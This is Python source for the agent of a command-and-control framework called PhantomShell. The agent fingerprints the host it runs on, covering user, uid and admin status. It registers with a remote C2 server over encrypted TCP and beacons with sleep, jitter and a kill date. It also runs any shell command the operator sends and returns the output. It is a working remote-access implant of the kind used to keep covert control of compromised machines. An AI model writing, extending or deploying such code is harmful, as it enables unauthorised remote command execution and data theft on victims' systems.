#!/usr/bin/env python3
"""PhantomShell v5.2 — Python Agent"""

import argparse
import hashlib
import hmac
import json
import logging
import os
import platform
import socket
import sys
import uuid

from config import DEFAULT_CONFIG
from transport.tcp import TcpTransport
from crypto.aes import AESCipher
from core.executor import Executor
from core.dispatcher import Dispatcher
from core.scheduler import Scheduler
from core.loader import ModuleLoader

logging.basicConfig(
    level=logging.WARNING,
    format="[%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("phantom.agent")

AGENT_ID = f"ps-{uuid.uuid4().hex[:12]}"


def get_system_info() -> dict:
    uname = platform.uname()
    return {
        "hostname": socket.gethostname(),
        "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        "uid": os.getuid() if hasattr(os, "getuid") else -1,
        "os": platform.system().lower(),
        "os_version": platform.version(),
        "kernel": uname.release,
        "arch": platform.machine(),
        "agent_type": "python",
        "agent_version": DEFAULT_CONFIG["agent_version"],
        "pid": os.getpid(),
        "ppid": os.getppid() if hasattr(os, "getppid") else -1,
        "process_name": sys.argv[0],
        "integrity": "high" if (hasattr(os, "getuid") and os.getuid() == 0) else "medium",
        "is_admin": hasattr(os, "getuid") and os.getuid() == 0,
        "capabilities": [],
        "transport": "tcp",
    }


def build_message(msg_type: str, payload: dict, session_id: str | None = None,
                  seq: int = 0) -> dict:
    msg = {
        "message_id": str(uuid.uuid4()),
        "timestamp": int(__import__("time").time()),
        "sequence": seq,
        "agent_id": AGENT_ID,
        "type": msg_type,
        "payload": payload,
    }
    if session_id:
        msg["session_id"] = session_id
    return msg


def main():
    parser = argparse.ArgumentParser(description="PhantomShell Python Agent")
    parser.add_argument("--host", default=DEFAULT_CONFIG["c2_host"])
    parser.add_argument("--port", type=int, default=DEFAULT_CONFIG["c2_port"])
    parser.add_argument("--sleep", type=float, default=DEFAULT_CONFIG["sleep"])
    parser.add_argument("--jitter", type=float, default=DEFAULT_CONFIG["jitter"])
    parser.add_argument("--kill-date", default=DEFAULT_CONFIG["kill_date"])
    parser.add_argument("--no-encrypt", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    transport = TcpTransport(
        host=args.host, port=args.port,
        retry_count=DEFAULT_CONFIG["retry_count"],
        retry_delay=DEFAULT_CONFIG["retry_delay"],
    )

    cipher = None
    if not args.no_encrypt:
        key = AESCipher.generate_key()
        cipher = AESCipher(key)

    scheduler = Scheduler(
        sleep_time=args.sleep,
        jitter_percent=args.jitter,
        kill_date=args.kill_date,
    )

    executor = Executor()
    dispatcher = Dispatcher()

    modules_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")
    loader = ModuleLoader(dispatcher)
    loaded = loader.load_all(modules_dir, package="modules")
    log.info(f"Loaded {loaded} modules")

    dispatcher.register_module(type("ShellModule", (), {
        "NAME": "shell",
        "COMMANDS": {
            "cd": {
                "handler": lambda path=".": {"path": executor.cd(path)[0], "ok": executor.cd(path)[1]},
                "description": "Change directory",
            },
            "pwd": {
                "handler": lambda: executor.cwd,
                "description": "Print working directory",
            },
            "capabilities": {
                "handler": lambda: {"modules": loader.loaded_modules, "commands": list(dispatcher.list_commands().keys())},
                "description": "List agent capabilities",
            },
        },
    })())

    def send_msg(msg_type: str, payload: dict, session_id=None, seq=0) -> bool:
        msg = build_message(msg_type, payload, session_id, seq)
        data = json.dumps(msg).encode()
        if cipher:
            data = cipher.encrypt(data)
        return transport.send(data)

    def recv_msg() -> dict | None:
        data = transport.recv()
        if not data:
            return None
        if cipher:
            try:
                data = cipher.decrypt(data)
            except Exception:
                log.error("Decryption failed, trying plaintext")
        try:
            return json.loads(data)
        except json.JSONDecodeError:
            log.error("Invalid JSON received")
            return None

    seq = 0
    session_id = None

    while True:
        if scheduler.check_kill_date():
            log.warning("Kill date reached, shutting down")
            break

        if not transport.connected:
            if not transport.connect():
                continue

            sysinfo = get_system_info()
            sysinfo["capabilities"] = dispatcher.modules
            sysinfo["sleep"] = scheduler.sleep_time
            sysinfo["jitter"] = scheduler.jitter_percent
            psk = os.environ.get("PS_AUTH_KEY", "phantomshell-default-key")
            reg_msg = build_message("register", sysinfo, seq=seq)
            reg_msg["auth"] = hmac.new(psk.encode(), AGENT_ID.encode(), hashlib.sha256).hexdigest()
            data = json.dumps(reg_msg).encode()
            if cipher:
                data = cipher.encrypt(data)
            transport.send(data)
            seq += 1

            ack = recv_msg()
            if ack and ack.get("type") == "ack":
                payload = ack.get("payload", {})
                session_id = payload.get("session_id")
                if payload.get("sleep") is not None:
                    scheduler.update_config(sleep=payload["sleep"])
                if payload.get("jitter") is not None:
                    scheduler.update_config(jitter=payload["jitter"])
                if payload.get("kill_date"):
                    scheduler.update_config(kill_date=payload["kill_date"])
                log.info(f"Registered with session: {session_id}")

        send_msg("beacon", {
            "uptime": int(__import__("time").time()),
            "idle": True,
            "active_tasks": 0,
            "cwd": executor.cwd,
            "username": os.getenv("USER", "unknown"),
            "integrity": "high" if (hasattr(os, "getuid") and os.getuid() == 0) else "medium",
            "pid": os.getpid(),
        }, session_id=session_id, seq=seq)
        seq += 1

        msg = recv_msg()
        if msg and msg.get("type") == "task":
            payload = msg.get("payload", {})
            task_id = payload.get("task_id", "unknown")
            command = payload.get("command", "")
            cmd_args = payload.get("args", {})
            raw = payload.get("raw")
            timeout = payload.get("timeout", 30)

            log.debug(f"Task {task_id}: {command}")

            if command == "exit":
                send_msg("response", {
                    "task_id": task_id,
                    "status": "ok",
                    "output": "Agent shutting down",
                }, session_id=session_id, seq=seq)
                break

            if command == "shell":
                cmd_to_run = raw or cmd_args.get("cmd", "")
                stdout, stderr, exit_code = executor.execute(cmd_to_run, timeout=timeout)
                response_payload = {
                    "task_id": task_id,
                    "status": "ok" if exit_code == 0 else "error",
                    "output": stdout,
                    "error": stderr,
                    "exit_code": exit_code,
                }
            elif dispatcher.has_command(command):
                result = dispatcher.dispatch(command, cmd_args)
                response_payload = {"task_id": task_id, **result}
            else:
                cmd_to_run = raw or (command + " " + " ".join(
                    f"{v}" for v in (cmd_args.values() if cmd_args else [])))
                stdout, stderr, exit_code = executor.execute(cmd_to_run, timeout=timeout)
                response_payload = {
                    "task_id": task_id,
                    "status": "ok" if exit_code == 0 else "error",
                    "output": stdout,
                    "error": stderr,
                    "exit_code": exit_code,
                }

            send_msg("response", response_payload, session_id=session_id, seq=seq)
            seq += 1

        scheduler.wait()

    transport.disconnect()


if __name__ == "__main__":
    main()
